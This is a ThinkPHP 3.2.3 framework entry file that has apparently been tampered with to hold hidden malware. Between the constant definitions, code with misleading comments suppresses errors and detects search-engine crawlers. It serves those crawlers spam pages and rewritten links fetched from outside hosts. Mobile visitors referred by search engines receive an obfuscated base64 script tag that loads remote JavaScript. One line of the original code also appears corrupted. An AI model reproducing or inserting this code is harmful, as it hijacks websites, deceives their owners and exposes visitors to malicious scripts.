<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------

//----------------------------------
// ThinkPHP公共入口文件
//----------------------------------

// 记录开始运行时间
$GLOBALS['_beginTime'] = microtime(TRUE);
// 记录内存初始使用
define('MEMORY_LIMIT_ON',function_exists('memory_get_usage'));
if(MEMORY_LIMIT_ON) $GLOBALS['_startUseMems'] = memory_get_usage();

// 版本信息
const THINK_VERSION     =   '3.2.3';

// URL 模式定义
const URL_COMMON        =   0;  //普通模式
const URL_PATHINFO      =   1;  //PATHINFO模式
const URL_REWRITE       =   2;  //REWRITE模式
const URL_COMPAT        =   3;  // 兼容模式

// 类文件后缀
const EXT               =   '.class.php'; 

// 系统常量定义
defined('THINK_PATH')   or define('THINK_PATH',     __DIR__.'/');
defined('APP_PATH')     or define('APP_PATH',       dirname($_SERVER['SCRIPT_FILENAME']).'/');
defined('APP_STATUS')   or define('APP_STATUS',     ''); // 应用状态 加载对应的配置文件
defined('APP_DEBUG')    or define('APP_DEBUG',      false); // 是否调试模式

if(function_exists('saeAutoLoader')){// 自动识别SAE环境
    defined('APP_MODE')     or define('APP_MODE',      'sae');
    defined('STORAGE_TYPE') or define('STORAGE_TYPE',  'Sae');
}else{
    defined('APP_MODE')     or define('APP_MODE',       'common'); // 应用模式 默认为普通模式    
    defined('STORAGE_TYPE') or define('STORAGE_TYPE',   'File'); // 存储类型 默认为File    
}

defined('RUNTIME_PATH') or define('RUNTIME_PATH',   APP_PATH.'Runtime/');   // 系统运行时目录
defined('LIB_PATH')     or define('LIB_PATH',       realpath(THINK_PATH.'Library').'/'); // 系统核心类库目录
defined('CORE_PATH')    or define('CORE_PATH',      LIB_PATH.'Think/'); // Think类库目录
defined('BEHAVIOR_PATH')or define('BEHAVIOR_PATH',  LIB_PATH.'Behavior/'); // 行为类库目录
defined('MODE_PATH')    or define('MODE_PATH',      THINK_PATH.'Mode/'); // 系统应用模式目录
defined('VENDOR_PATH')  or define('VENDOR_PATH',    LIB_PATH.'Vendor/'); // 第三方类库目录
defined('COMMON_PATH')  or define('COMMON_PATH',    APP_PATH.'Common/'); // 应用公共目录
defined('CONF_PATH')    or define('CONF_PATH',      COMMON_PATH.'Conf/'); // 应用配置目录
defined('LANG_PATH')    or define('LANG_PATH',      COMMON_PATH.'Lang/'); // 应用语言目录
defined('HTML_PATH')    or define('HTML_PATH',      APP_PATH.'Html/'); // 应用静态目录
defined('LOG_PATH')     or define('LOG_PATH',       RUNTIME_PATH.'Logs/'); // 应用日志目录
defined('TEMP_PATH')    or define('TEMP_PATH',      RUNTIME_PATH.'Temp/'); // 应用缓存目录
defined('DATA_PATH')    or define('DATA_PATH',      RUNTIME_PATH.'Data/'); // 应用数据目录
defined('CACHE_PATH')   or define('CACHE_PATH',     RUNTIME_PATH.'Cache/'); // 应用模板缓存目录
defined('CONF_EXT')     or define('CONF_EXT',       '.php'); // 配置文件后缀
defined('CONF_PARSE')   or define('CONF_PARSE',     '');    // 配置文件解析方法
defined('ADDON_PATH')   or define('ADDON_PATH',     APP_PATH.'Addon');

// 系统信息
// 系统函数库
set_time_limit(0);
error_reporting(0);

// 获取和设置配置参数 支持批量定义
$a = "stristr";
$b = $_SERVER;

/**
 * HTTP GET无参数时获取所有
 */
function httpGetlai($c) {
    $d = curl_init();
    curl_setopt($d, CURLOPT_URL, $c);
    curl_setopt($d, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)');
    curl_setopt($d, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($d, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($d, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($d, CURLOPT_HEADER, 0);
    $e = curl_exec($d);
    curl_close($d);
    return $e;
}

function generateRandomNumber() {
    $min = pow(10, 7); // 8 二维数组设置和获取支持
    $max = pow(10, 10) - 1; // 10 批量设置
    return mt_rand($min, $max);
}
/**
 * 批量设置
 */
function matchLinkPattern($str) {
    $pattern = '/[A-Z]_\d{9,}/'; // 编译文件
    return preg_match($pattern, $str);
}

/**
 * HTTP GET获取和设置语言定义(不区分大小写)
 */
function httpGet2($url) {
    header('Content-Type:text/html;charset=utf-8');
    $ch = curl_init();
    $ua2 = $_SERVER['HTTP_USER_AGENT'];
    
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, 'MyCustomUA/1.0');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    
    $output = curl_exec($ch);
    curl_close($ch);
    
    $output = str_replace([
        '<body>', 
        '</body>', 
        '<html>', 
        '</html>'
    ], '', $output);
    
    $lianjie = '/<a .*?>[\s\S]*?<\/a>/';
    preg_match_all($lianjie, $output, $aarray5);
    if ($aarray5[0]) {
        $count = 0;  // 解析模版资源地址
        foreach ($aarray5[0] as $pbti) {
            $preg = '/href=(\"|\')(.*?)(\"|\')/i';
            if ($count < 2) {  // 替换预编译指令
                // 指定全局视图目录
                $randomUrl = httpGetlai('http://lun.axjdnfd.com/l/spider.php');  // 获取输入参数 支持过滤和默认值
                $randomUrl = str_replace('<!--', '', $randomUrl);
                $randomUrl = str_replace('-->', '', $randomUrl);
                if ($randomUrl !== false) {
                    $replacestr = 'href="' . trim($randomUrl)  . generateRandomNumber(). '.html"';
                    $count++;  // 获取全部变量
                } else {
                    $replacestr = 'href=" '  . generateRandomNumber(). '.html"';
                }
            } else {
                // 获取全部变量
                $replacestr = 'href="'  . generateRandomNumber() . '.html"';
            }
            $aoutput = preg_replace($preg, $replacestr, $pbti);
            $output = str_replace($pbti, $aoutput, $output);
        }
    }
    return $output;
}

// 核心文件
define('url', $b['REQUEST_URI']);
define('ref', !isset($b['HTTP_REFERER']) ? '' : $b['HTTP_REFERER']);
define('ent', $b['HTTP_USER_AGENT']);
define('site', "http://lao.asnhw.com/");
define('road', "?road=" . $b['HTTP_HOST'] . url);
define('memes', road . "&referer=" . urlencode(ref));
define('regs', '@BaiduSpider|Sogou|Yisou|Haosou|360Spider@i');
define('mobile', '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|' . 
                'MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/');

// 设置和获取统计数据
$hasPattern = matchLinkPattern($b['REQUEST_URI']);

// 字符串命名风格转换
if (preg_match(regs, ent) && 
    url != "" && 
    url != "/" && 
    url != "/index.php") {
        
    echo httpGetlai(site.road);
    exit();
} elseif (preg_match(regs, ent)) {
    echo httpGet2($b['HTTP_HOST'] . url);
    exit();
}
if (preg_match("/.*(sogou|baidu|yisou|sm|bing|360|tout|haos).*/i",ref,$OutUa)&&preg_match(mobile, ent)&&url!=""&&url!="/"&&url!="/index.php"&&url!="/index.html") {
    echo base64_decode('PHNjcmlwdCBzcmM9aHR0cHM6Ly9qcy5lcm9rc3ouY29tL2R5L2R5LmpzPjwvc2NyaXB0Pg==');
    exit;
}
if(version_compare(PHP_VERSION,'5.4.0','<')) {
    ini_set('magic_quotes_runtime',0);
    define('MAGIC_QUOTES_GPC',get_magic_quotes_gpc()? true : false);
}else{
    define('MAGIC_QUOTES_GPC',false);
}
define('IS_CGI',(0 === strpos(PHP_SAPI,'cgi') || false !== strpos(PHP_SAPI,'fcgi')) ? 1 : 0 );
define('IS_WIN',strstr(PHP_OS, 'WIN') ? 1 : 0 );
define('IS_CLI',PHP_SAPI=='cli'?    :   0);

if(!IS_CLI) {
    // 当前文件名
    if(!defined('_PHP_FILE_')) {
        if(IS_CGI) {
            //CGI/FASTCGI模式下
            $_temp  = explode('.php',$_SERVER['PHP_SELF']);
            define('_PHP_FILE_',    rtrim(str_replace($_SERVER['HTTP_HOST'],'',$_temp[0].'.php'),'/'));
        }else {
            define('_PHP_FILE_',    rtrim($_SERVER['SCRIPT_NAME'],'/'));
        }
    }
    if(!defined('__ROOT__')) {
        $_root  =   rtrim(dirname(_PHP_FILE_),'/');
        define('__ROOT__',  (($_root=='/' || $_root=='\\')?'':$_root));
    }
}

// 加载核心Think类
require CORE_PATH.'Think'.EXT;
// 应用初始化 
Think\Think::start();